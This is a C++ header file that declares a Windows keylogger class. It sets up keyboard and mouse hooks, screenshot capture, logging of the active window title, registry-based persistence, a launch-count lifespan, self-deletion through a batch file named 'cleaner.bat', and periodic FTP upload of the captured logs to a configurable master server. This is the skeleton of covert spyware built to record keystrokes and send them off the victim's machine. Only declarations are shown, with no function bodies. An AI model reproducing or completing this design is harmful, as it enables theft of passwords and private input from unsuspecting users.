#ifndef H_KEYLOGGER
#define H_KEYLOGGER

/*
ASCII code: http://www.ascii-code.com/
Virtual Key codes: http://msdn.microsoft.com/en-us/library/ms927178.aspx
*/

//will activate FTP upload functionality, which needs SFML. Comment out for a full standalone version without FTP upload
#define USE_FTP

#define _WIN32_WINNT 0x0501

#ifdef USE_FTP
#define SFML_STATIC
#endif

#include <windows.h>
#include <iostream>
#include <ctime>
#include <fstream>
#include <string>
#include <sstream>
#include <map>

#ifdef USE_FTP
#include <SFML/Network.hpp>
#endif

#include "screenshot.h"

//registry keys
#define REGKEY_PERSIST "keylogger"
#define REGKEY_LIFETIME "lifespan"

//data folder name
#define DATADIR "data"

//time interval between server uploads
#define UPLOAD_DELTA 600

//name of the batch file used for deleting the program
#define BATCH_NAME "cleaner.bat"

//life time of the keylogger (i.e. number of launches before uninstalling it)
#define KEYLOGGER_LIFETIME "10"

class KeyLogger {

    public:

    //singleton
    static KeyLogger* getInstance();
    static void releaseInstance();

    //starts listenning
    void listen();
    
    //installs a persistent copy
    void install(std::string target);

    //erases program data
    void uninstall();

    //loop for standalone usage
    void loop();
    
    //setup FTP master server
    void setMaster(std::string _server, int _port, std::string _login, std::string _password, std::string _uploadDir = ".");

    //get user home directory
    std::string getUserHomeDirectory();

    //LEFT ALT state
    bool KeyLogger::isLAltDown() { return laltDown; }
    void KeyLogger::setLAltDown(bool down) { laltDown = down; }

    //RIGHT ALT state
    bool KeyLogger::isRAltDown() { return raltDown; }
    void KeyLogger::setRAltDown(bool down) { raltDown = down; }

    //LEFT CTRL state
    bool KeyLogger::isLCtrlDown() { return lctrlDown; }
    void KeyLogger::setLCtrlDown(bool down) { lctrlDown = down; }

    //RIGHT CTRL state
    bool KeyLogger::isRCtrlDown() { return rctrlDown; }
    void KeyLogger::setRCtrlDown(bool down) { rctrlDown = down; }

    //LEFT SHIFT state
    bool KeyLogger::isLShiftDown() { return lshiftDown; }
    void KeyLogger::setLShiftDown(bool down) { lshiftDown = down; }
    
    //RIGHT SHIFT state
    bool KeyLogger::isRShiftDown() { return rshiftDown; }
    void KeyLogger::setRShiftDown(bool down) { rshiftDown = down; }

    protected:

    KeyLogger();
    ~KeyLogger();

    void log(std::string text);
   
    void log(int vkCode);

    void removeSelf();

    void freeResources();

    std::string getTimeString();

    std::string screenshot();

    std::string getActiveWindowTitle();

    std::string removeFilespec(std::string path);
    
    void updateLifespan();

    void writeBuffer();

    void upload();
   
    void persist(std::string path = "");

    static LRESULT hookFunction(int nCode, WPARAM wParam, LPARAM lParam);

    void mapKeys();

    std::string keycodeToString(int keyCode);

    static KeyLogger* instance;

    bool laltDown;
    bool raltDown;
    bool lctrlDown;
    bool rctrlDown;
    bool lshiftDown;
    bool rshiftDown;

    HHOOK khook, mhook;
    
    std::ofstream logFile;
    std::stringstream logFileName;

    std::string programDir;
    std::string programPath;

    std::string keyboardBuffer;

    std::string activeWindowTitle;
   
    std::string hostname;
    
    std::map<int, char> kbdToAscii;
    std::map<int, std::string> specialKeys;

    #ifdef USE_FTP
    time_t lastUpload;
    sf::Ftp ftpClient;
    bool useFTP;
    std::string server, login, password, uploadDir;
    int port;
    #endif
};

#endif // H_KEYLOGGER
